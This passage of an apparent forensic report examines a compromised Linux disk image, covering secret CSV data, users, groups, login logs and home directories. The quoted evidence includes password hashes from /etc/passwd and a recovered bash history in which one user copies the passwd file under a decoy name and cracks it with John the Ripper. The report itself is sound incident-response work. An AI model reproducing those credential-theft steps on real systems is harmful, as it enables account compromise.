18088    5420    9015    5089   22210   11443   28701    4725    6961   17126
27035   16280   10106    7085   14482   21096    8385   23043   16259   19520
 6389   14777   30613   16085   28857   10480    4710   22547   27669   32084
27794   20405   26081   16665    7428    4774   19949   21430   11519   18459

END OF LINE
/images/sda1/secrets/numbers/57.csv
 2346   28532   22746    9391    2352   26519   19249   26970   13803    5209
 8138   30106    4914   29200   21995     878     187   11004      78   22947
31285   27444   26783   12181   15653    1874   28340     454   28801   25054
 8074    8992   10765   15227   16387    5898   28025   22995   18274      45
  311   12612    1410   12291   13598   32071   28889    8996   30400   29604

END OF LINE
/images/sda1/secrets/numbers/58.csv
31686   14730   17407    8925   13528   26416   11844   23198   21945   14769
 3286   18666   21222   23207   29994    3674   29044     202   21620   30679
 6348    1274    3521   22651    1062   15372   24019    5704    4038    8532
 8384   21899    7673    7671   21833   28430   20430   30957   31227    7424
 3477   15320    8199    2725    6937    6280   20450   12990   13213    6987

END OF LINE
/images/sda1/secrets/numbers/59.csv
20695   21210   13930   16394    6345   15881    6822   21792    6128   16190
22615   30018    4347    6169   26987     427    7931    2324    1580   11154
15498   18234    3664   22088    4537    4521   30399   32532   13499    8905
18466   18126   18771   31049   31280   31038   11005   13534   14263   11826
 3551     698   22380   24673   17005   21966    5492    5634    2015   26304

END OF LINE
/images/sda1/secrets/numbers/60.csv
18992   22780    4208   27814   22470   19514   26262   11930   27808   32384
14951    9254   15782   24967   12369   15079   23948    2082   11173    3058
11247   32044   14613   31394    6709    7472    9453   29728   25121   24283
14612    7091    2616   13858   24258   28621   21463   32307    8190   13265
28433    5661   17631   10917    4170    7230    2175   28156   17301   29808

END OF LINE
/images/sda1/secrets/numbers/61.csv
20151   12452   23997   11924    9547   16171    5235   28419   21871   19091
28876    4860    5117   11763   27015   20149   26557   25992   12240   22835
14739   22901   18764   11108   15208    6203   16101    5371   20952   15606
27733   17167   27808   32093   15476    5235   31173    7031   24130   22483
24453   14110   16052   20371   10495   15157   21311    5991   20897   25256

END OF LINE
/images/sda1/secrets/numbers/62.csv
15057   28216   18357   17307   28919   26785   24168   20117   25160   18243
  304   20757   28926    1552   25259   32320   14293    9216   16232   15384
28062   11692   27224   21877   30082   21932   13301   20419   10263   14002
 6191   24705    8484    7011   24347   15989    7732   26617    7259   19119
14813     409   14667   19781    4046   20341   30193   16840    5530   12706

END OF LINE
/images/sda1/secrets/numbers/63.csv
22282   15474   27117   11153    7976   24438   19598    9084    9317   10035
30449    5022    5118   14413   18521   10480   32758    4530   20538    3207
18079   19247   32425   27025   26344    8654   28546   22287   19818   28151
15451    8528   26161   24386     300   12081   32586    6685   32698   32534
18449    4898    3528   30631   31031   17461   14845    2123   29078    5985

END OF LINE
/images/sda1/secrets/numbers/64.csv
 1097   14138    5019    8326   10260   17720    5344   23154   10117   24024
28657    5762    6583   14575    6030   13621   17403   21863   12708   28382
 9148   13294   31374   23599   14867    4192    8206   31626   29993   17909
20490   16136   21328   18986   30470   28485    7136   27248   27237   28402
18899   14487   31327   11032    1056   20985   10177   17453   16344   28006

END OF LINE
/images/sda1/secrets/numbers/65.csv
30070    1629   25481    4247   26143    6391   11943   16015   31755   32550
19792   27361   25395   17840   26554   31670   25785    7332   14778   24253
28613    9474    3329   23732   21536   27946    6937    6581    2707   18437
 4893   20038    9981   27381   16187    1310   20535   32381    1515   27064
22952    3504   17132   29594   23207      91   13315   31330   24468    3057

END OF LINE
/images/sda1/secrets/numbers/66.csv
18493   18717    5488   28256   16070   25267   25381    8820   23649    2886
10723   29208     673   16772   30234   22999   22243   10220    6625   27031
 5182   20049   16070     114    4136    5902   18517   27220   24040   13318
21353   15193   15552   30562   24117    1252   15574   29706   25872   16511
18150   10720       5    3189   29354   14783   19735    5681   22532   23862

END OF LINE
/images/sda1/secrets/numbers/67.csv
12091   28918      99     455    3669   26866    6537   30782   19182   31275
 9649   31138      58   27310   13681   27496    8482   29469    4625   25179
 6696   12639   30914    8999   13565    6664   19870    8099    6628    5255
  612   31969    2756   11794   11503   28151   13328    3922    2427   28556
12119    8398   25752   12322    5034    2584   10474   12581   12209   30649

END OF LINE
/images/sda1/secrets/numbers/68.csv
14116    9459   16814   21738   23227   16322   31215   31718   17978    4272
24807   10086   13508   20203    3014   12077   24166   19260   20151   26768
15841   20451    5508   20400   26421    8752    6921    2163   15090     481
11098   29511     574   16959   23732   20886   16293   22775   27428   13831
16547   32441    8953   15482   15347   15762    1515   17858    2198    2314

END OF LINE
/images/sda1/secrets/numbers/69.csv
25425   12280   12300   17072    7206   16073   16861   15237    7789   12826
11099   16466   27764   21121   17971    7304   21959    7259   16359   20798
27977    4540   25415    9986   17687   16158   32174    4192    3100   24261
23554   10547   26996   18163    7017   24238   12674    3793   18892    3112
20688    5656    4620    6316    2217   23426   28679   24892   22904   19956

END OF LINE
/images/sda1/secrets/numbers/70.csv
16342   25099    7500   25785   21205   13265   26274    8927   23325   16920
 3138   18996   25246   25202    7629    6561   10257   16381   31314    4683
  944    1904   14696   16510   23480   18408    2573   10074   25759    5232
 9026   15163   10517   12882    8802    5866    5565   24608   29510   22405
 1192     385    7707   19246    1174   15293    5886   24182   22507   20230

END OF LINE
/images/sda1/secrets/numbers/71.csv
 2117    7341      69   29839   26327   24863   16076   26575   13765   20634
14254    6514    4821   10524   31967   31041    3981    3935   22801    8673
 3678    8843   32445    2289   18061    4027    7154    5350    6885   24886
24288   13478   12062    1386   14115   21733   26635   18855   24529   20291
17031   17569   32322   12066   11549   27812   24994   26697   20602   21909

END OF LINE
/images/sda1/secrets/numbers/72.csv
21260   17388   22864   13205   23637    6749   15140   22637    6727    9472
18470    1410   22311   26016   21972    3513   24873   24040    9955   27303
15718    3250   27794   22715    3741   29709     460    2603   11177   29712
15360    7327    8646    1634   28097   15776    7812    9860   30493   10687
32135   29413   32701   29317   30212   21156   14017   14110    9211   11299

END OF LINE
/images/sda1/secrets/numbers/73.csv
19435   12029   27501   31031    1136   17396   18397   18575   23634   29816
 5495   28002   10077    1643   28340    2615   28288    2739   20885   25093
  516   26822   12859   19619   29577    5880    6982    1526   13253    2948
30701   17364   20476   12892   25570   16058    2879   29617    7395    6451
20324    5952   29216   20994   12745    4195   19792   11542    1991   32467

END OF LINE
/images/sda1/secrets/numbers/74.csv
28591    8327   14432   16551    8514    9055   16269   30181   22907   25153
22830   14560   18699   17210   14235   28039   22546    1280   26903   15894
 3660     428    2527    4659   20987   24889    2806   23499   10644   30652
 6574   21931   27689   19297   29686    4062    3225   32297   13671   26057
27513    5989   26893   14855   23489   26866   27637    5125   17975    3122

END OF LINE
/images/sda1/secrets/numbers/75.csv
31971   32034   19659   10451   16593   19569   21695    9535   13422   32323
20675   30921    1752    4617   16227   24702    2305   16718   31467     474
22077   27467    4825   26045   31117    7754   20483   10029    7081   23227
20360   20945    1487   27671   24696   11305    1358   29560    4163   27022
31697   32757    4578   32749   10348   20671   27591    7491   30056    7421

END OF LINE
/images/sda1/secrets/numbers/76.csv
29939    7392   26649    4546    8133   30938    4730    8467   30822   14706
15665   23772   31492    4748   26996   17307   13777   14772    8985   21693
18030   13601   27111    3584   16918    7789   25497   25225   29835   21778
 8881    1988    8641   23716    3587   13312   13899   25297   13564   10950
 4745   10520    7351   13052   23695   20044   20926   21182    1236   13256

END OF LINE
/images/sda1/secrets/numbers/77.csv
31168   29309    8628   11495   28426   20999   31036   25272    2395   18864
10877   28557    1705   16401   18126   24997   31986   16893   16023   12910
12808    3165    7175   10692    9247   22475   15483   14567    3863   16881
13481    2366   31370   28832   19344   15054    7317   19119   14368    3705
 7527   25242    3497   30710    1931   28374     772   21396   28917   27637

END OF LINE
/images/sda1/secrets/numbers/78.csv
17717   21366   25010   24746   28950   20424   29699    1881    2015   21853
  579   25012    8749    2105   26067   15515    2988    5781   25354   20499
17493    1899   17104   11949   22888   26048   27133   16312   21033   21684
 2671   12326   11354   22602   18925    1599    9339   24312   31423   17415
17860   22510   16905   17520   32222   25126   18411   16192   12389   24624

END OF LINE
/images/sda1/secrets/numbers/79.csv
23673   22312   23393   19407   14356   16157   11013    7376   13834   11158
25820   12696   27196   10207    7482    1691   29404   15910   14099   28774
11452   25558    3877   25947   24657   20405   11749   10025   13194    5564
11307    2062   27731    9402   13980   18380   20455     423   23515   17516
10970   23753    4463   31414   19938   23689    7026    4715    2921   14866

END OF LINE
/images/sda1/secrets/numbers/80.csv
 1378   23493    4519    8465   24844   10102   31676   15508    7166    3097
20232    6023   29168   29292   30389    6443   14159   28507   27733   26481
 4753   14382    5789    1283   28506   11634   22499   17422    1872   10409
 2137    6609    7359   30897   22535    7911   17132   14580   21642   18516
20537   28501    3726    9553   22013    7381    6925   11736   14880   11529

END OF LINE
/images/sda1/secrets/numbers/81.csv
 3162   22897    7726   18797   16142   20312   17669   26912    8855   23591
  683   31484   25365   21354   28932   16707   13959    8998   14814   32063
30545   25254    3021   14573   27246     514     197   32616   11636   26228
21116   12311    2125   32602   30845   22678    7855    8202    3084   16741
15712   10842    3517    6483   16172   21994   26835   27560   17825    8248

END OF LINE
/images/sda1/secrets/numbers/82.csv
29382   15818   12172    8657   29359   21779    5419     574   27756   20949
26184   11130   31451   31017   31957   25886   16031   17884    1631    1172
21695   28889     523   22884    6909    5206    8786    4669   24056   21953
 3708   26310   19713   17001   16349    4642   20413   19181   30418   27205
 6527    2405     891    8186    5730   15954   24117   29616    3625   12358

END OF LINE
/images/sda1/secrets/numbers/83.csv
30353    2690    9897    1236    6687   11769   16449   23261   27005   23409
19550   23039   17237   23581   19748   13273    5826    3435   16410   14744
21988   20116   20887   10481    1315   11269   23277   19674   29508   25713
 5970   28171   26157    9139   15250   20280   18552    3941   23671   12555
 9146     320   20468    6627   29584    2874   29972   23887    7533    8537

END OF LINE
/images/sda1/secrets/numbers/84.csv
14682   27528   19498    1928    3824   14110   31745    4498   12915   27883
 5017   25030    7041   19689    3838    9108    2658   29039   15094    3772
18900   31495   27049   15500   16787    7694   17933    5334    9642   28174
29203    3763   20092     732   23443   16635    1425   21360   29688   32383
21282   25223   13995   31245    6243    6394   10816   11809     659   27100

END OF LINE
/images/sda1/secrets/numbers/85.csv
18330    8282   10942   11859   23917   30925   24094   14509   19945   26918
12548   12378    3566   27269   10340   10966   22260    1029   27075   26449
14058    4960    5234    5436   16850   29794   29320   30616   16665   13071
15776   28921   31927   13459   29527   17500   31243     750   30084    5807
19572   10076   29238   32025   21423   16261   20335    9229    1011   14697

END OF LINE
/images/sda1/secrets/numbers/86.csv
19682    3587   21243   11679   28677   30094   31533   23792   10434    7377
29248    3911    8660   20741    9804    9583   15350   18885    1232   16135
20000   19102   27467   13548   11649   20825    1434   20071   14651   23815
13845    7447   26081    6609   25448   11165    1201   32125   18481   27401
17041    8383    8286    2824    6859   24901   20548   10442   14728    6272

END OF LINE
/images/sda1/secrets/numbers/87.csv
 4368   28891    1405    2311    1402   20334    6863    9734   11339   20793
20645    1501   21365    1725    1353     804   17527   32232   28480   28661
20583    2867   17975   27244    4289    2171    3756   31970   26865    9633
29789    1508    5282    9952   24433    9205   20164   11505   12391    8456
23904   25312   20162    6588    3611   11692   30321   23637   28555   14753

END OF LINE
/images/sda1/secrets/numbers/88.csv
11560   30185    4888    4795   32220   21332   18319   14012   21633   26971
 1321    9860     597   32530    2447   16322   31850   28576   16433   12944
 9269   13793   15274    7280    3284    5565   23025   22279   18722   32582
32581   30363    3709    1940    5079   13390   14418    4960   12340   16408
30829    3939    9337   13958   16386   21100   17973   13876   11642    1348

END OF LINE
/images/sda1/secrets/numbers/89.csv
 8059    5280   25260   20397   14057    7329    1638   28421   24817   27943
22017    6918   12270   14408   20858   22637   22642   23342   16386    1998
31525   22727   21297   11804   12388   21296   16906   14839   12693   12255
 6067   20921   15436   21138   12785   30270    2847    6907   11109    1655
   73    4392   11656   28590   24065   27828   26216    5782   10392   25264

END OF LINE
/images/sda1/secrets/numbers/90.csv
 2497   13651   29037   31337   11619   27654   19013   14695    5381   15009
20735    2405    7391    3412   25539    2642    5019   20505   29614    2295
19922     640    6838   21917   30029   15416   13121   22907    4088   28252
19845    5862   31397   28035    7838      55   21383    4230   17776   20859
 4201   28687     322   22750   15537    4838   13847   22996    6936    4859

END OF LINE
/images/sda1/secrets/numbers/91.csv
  211    2163   27527    9532   11763   22965   11523   21959   30334   19296
 6859    8633   16312   16292    2583    9304   16028   29108   23348   15603
 6351   25157   29270    9666   10311    4036   28963    7291   19898   30298
31995   30900   32201    5024    7689   19452   29929   27170     779   26551
15893   16533   13793   25789   30774    6360    3287    2226    1613    6829

END OF LINE
/images/sda1/secrets/numbers/92.csv
 5495    7637   29160   30630   16827   20677    4198   15712   29632   22766
24630   14565   16175   21203   17418    5988   28603   19579   11496    1886
24096   15543    3457   24266    6367    9010   10066   30729   23734    7485
 3452   29068    6369   31575   31076   15431   31507    9087   19722    9428
16179   19514   24362   17256   16087   23651   27925   32374   31873   31670

END OF LINE
/images/sda1/secrets/numbers/93.csv
 9643   21797   13979   14926   10458    6927    7888    3712   30599   20085
14734   24169    9938   29223   24691   18809   21381    1212   12093   17192
21234   22075   26117   11898    5512    3212   13115    9813    5944     673
 8549   32386   31114   28259    9367   18821    9085   31071     945   28445
  803   14381    6491    8089   19705   11428   10433   12257   21767   16063

END OF LINE
/images/sda1/secrets/numbers/94.csv
30826   21638   28703   28295   10178   31508   24753    2926   24080    6924
26288   15741   17879   28743   14456   15615   23802   12624   29335     678
10761   26814   11252   17991   31310    2133    8380   11608   29845    4572
 8208   25899    3263   29116   10351    9448    9222   26461   24293   21324
25101    5952   19697   19492    4783    8924    4407     391    5252   25146

END OF LINE
/images/sda1/secrets/numbers/95.csv
 8756   21986   32030   16370   28562   14873   24333    7213   16437   13335
 5099    9783    6127   18187   30322   21145   19382   26334   10883   29985
20510   11006   26118   20111   29594   25066   27524   18690     114   20862
 4741    3877     643   12284   31147   27160   11450    8670   16011    4640
 6735   18526   22351   24079   26561   11457   27148   32114   24468    5223

END OF LINE
/images/sda1/secrets/numbers/96.csv
 3375   31250   10018   29534    8032   22308   24530    7581   15852   14371
30364    9319    3163   26121   18155   31886    3301   21906   22056    6877
15040     407   21735   23507   32042    3884    1748   11039   16182    6008
15707    9947   14422   13143   20762   14985   12716    9393   17928   28110
21520   14744    1634   25328   19168   17700   24665   16657   18315   18958

END OF LINE
/images/sda1/secrets/numbers/97.csv
 7631   12976   32132    6715    5937   11847   25123   11229   25660   25340
29706   10059    1962     170   13375   24813   13408   16352    7375   24680
 1368    6493    2206   14964   18512   31051   19440   11387   18228   27196
18867   22007   15436   29669    4498   11144   23845   10653   21178   32728
10305    9363   12138   15919   24958   26066   15677   13013   26951   23542

END OF LINE
/images/sda1/secrets/numbers/98.csv
18200   25539   18455    6017    4715    2109    6738   12822   11229   19679
16201   10576    4442   10026   22678   26709   30705   12708   15704   25789
32267   22370   11473   13057   17769   11354    3776   30114   12511   32357
23935    4889   16850   27415    5597   24194   20851    1599   18617    7943
 8632   23868   10851    8717     543   25350   15282   17441    1058    4344

END OF LINE
/images/sda1/secrets/numbers/99.csv
23038    4803    8269    3834   11135    6807   11679   21964   30876   18025
 3966   25253    2799   18191   16236    5498    2560    2694   23891   19728
19314   18096    2458   26132   31216   29648   21481    4092   16085   29377
19133    5019   23198   23289   30635   26503   22544   11329   21619   11819
17960   24626    1228   31147    9415    5999   24809   29051   28698   24228

END OF LINE
/images/sda1/secrets/numbers/100.csv
 7828   27516   28754   30837   25069   19700    7496    7122   12024   16057
18865   17159   31722    8291   27240    8552   27958   23156    5417   25717
22275   24916    3548    1345   26958   27667   23713   21379   29407   23261
14495    5757   26349    2364   21388   24465    4496    2065   20988   27292
 9963   31568   31851   10265    6421    6014   29961   19703   24780   31468

END OF LINE
/images/sda1/secrets/numbers/NOTICE
THIS DATA MUST NOT FALL INTO THE WRONG HANDS
/images/sda1/secrets/other
/images/sda1/secrets/other/secret.data

!REMOVED FROM REPORT, Binary data!
</pre>
</div>
</div>
</div>

<div id="outline-container-orgfe929f7" class="outline-4">
<h4 id="orgfe929f7"><span class="section-number-4">4.2.8</span> Look for users</h4>
<div class="outline-text-4" id="text-4-2-8">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 17: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/sda1
ls -la home/
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 18: </span>Results</label><pre class="src src-text">total 36
drwxrwsr-x  9 root  staff 4096 2007-09-10 04:21 .
drwxr-xr-x 21 root  root  4096 2007-09-10 03:07 ..
drwxr-xr-x  2  1004  1004 4096 2007-09-10 03:11 bill
drwxr-xr-x  2  1001  1001 4096 2007-09-10 04:03 fred
drwxr-xr-x  2  1005  1005 4096 2007-09-10 03:13 guest
drwxr-xr-x  4  1006  1006 4096 2007-09-10 04:26 jake
drwxr-xr-x  2  1003  1003 4096 2007-09-10 04:03 jane
drwxr-xr-x  2 tuser  1000 4096 2007-09-10 02:56 john
drwxr-xr-x  2  1002  1002 4096 2007-09-10 04:27 mike
</pre>
</div>

<p>
How about with <code>passwd</code>?
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 19: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/passwd
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 20: </span>Results</label><pre class="src src-text">root:$1$vp2jt2uc$jRjAN0EvFBHbtiBY33fSW/:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:100:sync:/bin:/bin/sync
games:*:5:100:games:/usr/games:/bin/sh
man:*:6:100:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
postgres:*:31:32:postgres:/var/lib/postgres:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
operator:*:37:37:Operator:/var:/bin/sh
list:*:38:38:SmartList:/var/list:/bin/sh
irc:*:39:39:ircd:/var:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/home:/bin/sh
john:$1$kj5qXZbQ$ZoULHcRveDDHzsOsTUVwd0:1000:1000:John Finkelstein,,,:/home/john:/bin/bash
identd:!:100:65534::/var/run/identd:/bin/false
sshd:!:101:65534::/var/run/sshd:/bin/false
fred:$1$hzYlBK./$HB93670uewrh68H.1JfL3.:1001:1001:Hank Snow,,,:/home/fred:/bin/bash
mike:$1$UO8.DgZE$jgLudTIzf7wR7PDuob47M1:1002:1002:Mike DeJesus,,,:/home/mike:/bin/bash
jane:$1$z8E1XOpC$C2sstT/mpixW1DjY06ouP0:1003:1003:Jane Wei,,,:/home/jane:/bin/bash
bill:$1$iM.H9CLO$t/wfgA6Ss12UJlkA6rIle.:1004:1004:Bill Boyardee,,,:/home/bill:/bin/bash
guest:$1$t4fC1TfN$3gSwUWOK8nMsX9bf61khq/:1005:1005:Yoyodyne Guest,,,:/home/guest:/bin/bash
jake:$1$WkuB0RMS$3IJwa3BO27vxjFwv4wVr./:1006:1006:S. Kiddie,,,,Pwned!:/home/jake:/bin/bash
</pre>
</div>

<p>
The user <b>jake</b> look suspicious.
</p>
</div>
</div>

<div id="outline-container-orgd57b508" class="outline-4">
<h4 id="orgd57b508"><span class="section-number-4">4.2.9</span> Look for groups</h4>
<div class="outline-text-4" id="text-4-2-9">
<p>
Look at the groups file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 21: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/group
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 22: </span>Results</label><pre class="src src-text">root:*:0:jake
daemon:*:1:
bin:*:2:
sys:*:3:
adm:*:4:
tty:*:5:
disk:*:6:
lp:*:7:lp
mail:*:8:
news:*:9:
uucp:*:10:
proxy:*:13:
kmem:*:15:
dialout:*:20:
fax:*:21:
voice:*:22:
cdrom:*:24:
floppy:*:25:
tape:*:26:
sudo:*:27:
audio:*:29:
dip:*:30:
postgres:*:32:
www-data:*:33:
backup:*:34:
operator:*:37:
list:*:38:
irc:*:39:
src:*:40:
gnats:*:41:
shadow:*:42:
utmp:*:43:
video:*:44:
staff:*:50:
games:*:60:
users:*:100:
nogroup:*:65534:
john:x:1000:
secretive:x:101:john,hank,jane,root,jake
fred:x:1001:
mike:x:1002:
jane:x:1003:
bill:x:1004:
guest:x:1005:
jake:x:1006:
</pre>
</div>

<p>
It look suspicious that the user <b>jake</b> belongs to the <b>root</b> group.
</p>
</div>
</div>

<div id="outline-container-org6e723a0" class="outline-4">
<h4 id="org6e723a0"><span class="section-number-4">4.2.10</span> Look at lastlog</h4>
<div class="outline-text-4" id="text-4-2-10">
<p>
Lastlog is a logfile that shows the last time a user logged in.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 23: </span>Commands (Needs to be executed in a shell)</label><pre class="src src-sh">sudo chroot /images/sda1/
lastlog
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 24: </span>Results</label><pre class="src src-text">Username         Port     From             Latest
root             tty1                      Mon Sep 10 04:32:26 -0700 2007
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
games                                      **Never logged in**
man                                        **Never logged in**
lp                                         **Never logged in**
mail                                       **Never logged in**
news                                       **Never logged in**
uucp                                       **Never logged in**
proxy                                      **Never logged in**
postgres                                   **Never logged in**
www-data                                   **Never logged in**
backup                                     **Never logged in**
operator                                   **Never logged in**
list                                       **Never logged in**
irc                                        **Never logged in**
gnats                                      **Never logged in**
john                                       **Never logged in**
identd                                     **Never logged in**
sshd                                       **Never logged in**
fred             pts/0    10.10.10.107     Mon Sep 10 04:01:29 -0700 2007
mike             pts/0    10.10.10.107     Mon Sep 10 04:08:23 -0700 2007
jane             pts/1    10.10.10.107     Mon Sep 10 04:17:31 -0700 2007
bill                                       **Never logged in**
guest                                      **Never logged in**
jake             pts/1    yoyodyne         Mon Sep 10 04:23:15 -0700 2007
</pre>
</div>
</div>
</div>

<div id="outline-container-org7257c9b" class="outline-4">
<h4 id="org7257c9b"><span class="section-number-4">4.2.11</span> Hosts</h4>
<div class="outline-text-4" id="text-4-2-11">
<p>
Look at hosts file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 25: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/hosts
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 26: </span>Results</label><pre class="src src-text">127.0.0.1       yoyodyne        localhost

# The following lines are desirable for IPv6 capable hosts
# (added automatically by netbase upgrade)

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
</pre>
</div>
</div>
</div>

<div id="outline-container-org1056346" class="outline-4">
<h4 id="org1056346"><span class="section-number-4">4.2.12</span> Freds account</h4>
<div class="outline-text-4" id="text-4-2-12">
<p>
Look at the users home dirs.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 27: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/fred -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 28: </span>Results</label><pre class="src src-text">/images/sda1/home/fred
/images/sda1/home/fred/.bashrc
/images/sda1/home/fred/.bash_profile
/images/sda1/home/fred/.alias
/images/sda1/home/fred/.cshrc
/images/sda1/home/fred/memo.txt
/images/sda1/home/fred/.bash_history
</pre>
</div>

<p>
Look at the memo
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 29: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/fred/memo.txt
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 30: </span>Results</label><pre class="src src-text">
</pre>
</div>

<p>
Look at fred&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 31: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/fred/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 32: </span>Results</label><pre class="src src-text">ls -alh /
whoami
cd /secrets/
less /etc/group
ls
vi memo.txt
ls
</pre>
</div>
</div>
</div>

<div id="outline-container-org08ef2b6" class="outline-4">
<h4 id="org08ef2b6"><span class="section-number-4">4.2.13</span> Mikes account</h4>
<div class="outline-text-4" id="text-4-2-13">
<p>
Look at the users home dirs.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 33: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/mike -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 34: </span>Results</label><pre class="src src-text">/images/sda1/home/mike
/images/sda1/home/mike/.bashrc
/images/sda1/home/mike/.bash_profile
/images/sda1/home/mike/.alias
/images/sda1/home/mike/.cshrc
/images/sda1/home/mike/.bash_history
</pre>
</div>


<p>
Look at fred&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 35: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/mike/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 36: </span>Results</label><pre class="src src-text">ls
mkdir test
rmdir test
mkdir /etc/foo
sudo mkdir /etc/foo
su -
ls /
cd /secrets
cd /secrets
cd /secrets
cd /var/../secrets/
cat /etc/passwd
cp /etc/passwd calendar.txt
wget http://www.openwall.com/john/f/john-1.7.2.tar.bz2
curl
lynx
lynx http://www.openwall.com/john/f/john-1.7.2.tar.bz2
ls
reset
less .bash_history
cat .bash_history
lynx http://www.openwall.com/john/f/john-1.7.2.tar.bz2
ls
tar -xvzf john-1.7.2.tar.bz2
tar -xvjf john-1.7.2.tar.bz2
which bzip2
rm john-1.7.2.tar.bz2
lynx http://www.openwall.com/john/f/john-1.7.2.tar.gz
ls
tar -xvzf john-1.7.2.tar.gz
cd john-1.7.2
ls
less README
less doc/INSTALL
cd src/
ls
make
make | less
make linux-x86-mmx
ls
cd ..
ls
cd ..
cp john-1.7.2/run/john .
ls
less john-1.7.2/doc/INSTALL
./john --test
mv john john-1.7.2/run/
mv calendar.txt john-1.7.2/run/
cd john-1.7.2/run/
ls
./john --test
./john calendar.txt
su -
whoami
</pre>
</div>


<p>
Look for calendar.txt
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 37: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/ -type f -name calendar.txt
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 38: </span>Results</label><pre class="src src-text">
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd8bc193" class="outline-4">
<h4 id="orgd8bc193"><span class="section-number-4">4.2.14</span> Janes account</h4>
<div class="outline-text-4" id="text-4-2-14">
<p>
Look more into Janes account.
</p>

<p>
Look at files found in Janes home dir.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 39: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/jane -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 40: </span>Results</label><pre class="src src-text">/images/sda1/home/jane
/images/sda1/home/jane/.bashrc
/images/sda1/home/jane/.bash_profile
/images/sda1/home/jane/.alias
/images/sda1/home/jane/.cshrc
/images/sda1/home/jane/.bash_history
</pre>
</div>

<p>
Janes bash history.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 41: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/jane/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 42: </span>Results</label><pre class="src src-text">cd /secrets
ls
less numbers/83.csv
less numbers/82.csv
cd /secrets/
ls
cd other/
ls
cat secret3.data &gt;&gt; newsecret.data
ls -alh
cat secret3.data &gt;&gt; newsecret.data
cat secret2.data &gt;&gt; newsecret.data
ls
cat newsecret.data
qls
reset
ls
logout
</pre>
</div>
</div>
</div>

<div id="outline-container-org18e6693" class="outline-4">
<h4 id="org18e6693"><span class="section-number-4">4.2.15</span> Jakes account</h4>
<div class="outline-text-4" id="text-4-2-15">
<p>
This account seems to have been compomised.
</p>

<p>
Look at the Jakes home dir.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 43: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/jake -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 44: </span>Results</label><pre class="src src-text">/images/sda1/home/jake
/images/sda1/home/jake/.bashrc
/images/sda1/home/jake/.bash_profile
/images/sda1/home/jake/.alias
/images/sda1/home/jake/.cshrc
/images/sda1/home/jake/.ssh
/images/sda1/home/jake/.ssh/known_hosts
/images/sda1/home/jake/.elinks
/images/sda1/home/jake/.elinks/numbers
/images/sda1/home/jake/.elinks/other
